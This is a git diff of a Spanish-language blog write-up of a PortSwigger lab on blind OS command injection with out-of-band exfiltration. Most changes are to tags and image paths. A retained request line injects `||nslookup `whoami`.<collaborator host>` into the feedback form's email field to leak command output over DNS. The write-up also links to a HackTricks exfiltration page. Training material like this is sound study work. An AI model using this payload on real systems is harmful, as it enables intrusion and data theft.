@@ -6,16 +6,10 @@ categories:
   - Portswigger
   - OS Command Injection
 tags:
-  - OS
-  - Command
-  - Injection
-  - OS
-  - command
-  - injection,
-  - simple
-  - case
+  - OS Command Injection
+  - Blind OS command injection with out-of-band data exfiltration
 image:
-  path: /assets/img/OS-Command-Injection-Lab-1/Portswigger.png
+  path: /assets/img/OS-Command-Injection-Lab-5/Portswigger.png
 ---
 
 ## Skills
@@ -38,19 +32,19 @@ Este `laboratorio` contiene una `Blind OS Command Injection` en la `función` de
 
 Al `acceder` a la `web` nos sale esto
 
-![[image_1.png]]
+![](/assets/img/OS-Command-Injection-Lab-5/image_1.png)
 
 Pulsamos en `Submit feedback` y vemos un `formulario`
 
-![[image_2.png]]
+![](/assets/img/OS-Command-Injection-Lab-5/image_2.png)
 
 Hacemos `click` sobre `Submit feedback` y `capturamos` la `petición` con `Burpsuite`
 
-![[image_3.png]]
+![](/assets/img/OS-Command-Injection-Lab-5/image_3.png)
 
 La `respuesta` obtenida son unas `llaves vacías {}`
 
-![[image_4.png]]
+![](/assets/img/OS-Command-Injection-Lab-5/image_4.png)
 
 Nos dirigimos a `Burpsuite Collaborator` hacemos `click` en `Copy to clipboard`, debido a que no recibimos `ninguna respuesta` que indique que estamos `inyectando comandos`, esta es la única forma que podemos utilizar para ello, debemos usar este `payload` en los diferentes `campos` para ver si son `inyectables`
 
@@ -60,7 +54,7 @@ csrf=h2bWPuUAS3XRnSo6w2sMMhhnp9pXPlbe&name=test&email=||nslookup+`whoami`.s6z1cm
 
 Si nos vamos a `Burpsuite Collaborator` nuevamente veremos que hemos obtenido `dos peticiones DNS` con el `output` del comando `whoami`
 
-![[image_5.png]]
+![](/assets/img/OS-Command-Injection-Lab-5/image_5.png)
 
 Si necesitamos obtener más de una línea podemos usar este otro `payload` de `Hacktricks` [https://book.hacktricks.xyz/pentesting-web/command-injection#dns-based-data-exfiltration](https://book.hacktricks.xyz/pentesting-web/command-injection#dns-based-data-exfiltration)
 
